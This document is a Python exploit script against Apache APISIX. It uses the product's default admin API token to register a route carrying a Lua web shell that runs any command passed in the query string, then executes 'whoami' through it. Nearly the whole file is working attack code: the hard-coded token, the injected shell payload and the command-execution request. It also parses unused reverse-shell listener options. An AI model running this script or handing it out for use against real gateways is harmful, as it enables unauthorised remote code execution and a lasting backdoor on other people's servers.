#!/usr/bin/python3

'''Apache APISIX是一个高性能API网关。在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token
`edd1c9f034335f136f87ad84b625c8f1`，攻击者利用这个Token可以访问到管理员接口，进而通过`script`参数来插入任意LUA脚本并执行。
'''
import json
import argparse
import requests
import sys


# Interface class to display terminal messages
class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Advanced Web Attacks and Exploitation')
        print('    >> Python Skeleton Script\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")


def default_header():
    header = {
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept': '*/*'
    }
    return header


def default_proxies():
    proxies = {
        "http": 'http://127.0.0.1:9003',
        "https": 'http://127.0.0.1:9003'
    }
    return proxies


def sendGet(url, header, debug):
    try:
        if debug is True:
            r = requests.get(url, headers=header, proxies=default_proxies())
        else:
            r = requests.get(url, headers=header)
    except requests.exceptions.ProxyError:
        output.error('Is your proxy running?')
        sys.exit(-1)
    return r


def sendPost(url, data, header, debug):
    try:
        if debug is True:
            r = requests.post(url=url, data=data, headers=header, proxies=default_proxies())
        else:
            r = requests.post(url=url, data=data, headers=header)
    except requests.exceptions.ProxyError:
        output.error('Is your proxy running?-')
        sys.exit(-1)
    return r


def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip', help='Listening IP address for reverse shell', required=False)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=False)
    parser.add_argument('-u', '--username', help='Username to target', required=False)
    parser.add_argument('-p', '--password', help='Password value to set', required=False)
    parser.add_argument('-d', '--debug', help='Instruct our web requests to use our defined proxy', action='store_true',
                        required=False)
    args = parser.parse_args()

    # Instantiate our interface class
    global output
    output = Interface()

    # Banner
    output.header()

    # Debugging
    if args.debug:
        for k, v in sorted(vars(args).items()):
            if k == 'debug':
                output.warning(f"Debugging Mode: {v}")
            else:
                output.info(f"{k}: {v}")

    # Authentication Bypass
    #response = sendGet(f"http://{args.target}", args.debug)
    post_header = default_header()
    post_header["X-API-KEY"] = "edd1c9f034335f136f87ad84b625c8f1"

    data = {
        "uri": "/attack",
        "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = "
                  "assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = "
                  "assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
        "upstream": {
            "type": "roundrobin",
            "nodes": {
                "example.com:80": 1
            }
        }
    }

    shell_command = "whoami"
    response_post = sendPost(f"http://{args.target}/apisix/admin/routes", json.dumps(data), post_header, args.debug)

    # Remote Code Execution
    response_cmd_shell = sendGet(f"http://{args.target}/attack?cmd=" + shell_command, post_header, args.debug)

    output.success("command " + shell_command + " result:" + response_cmd_shell.text.replace('\n', ''))

    # Try Harder
    output.success('Exploit has been successfully executed. :eyes: on your listener!')


if __name__ == '__main__':
    main()
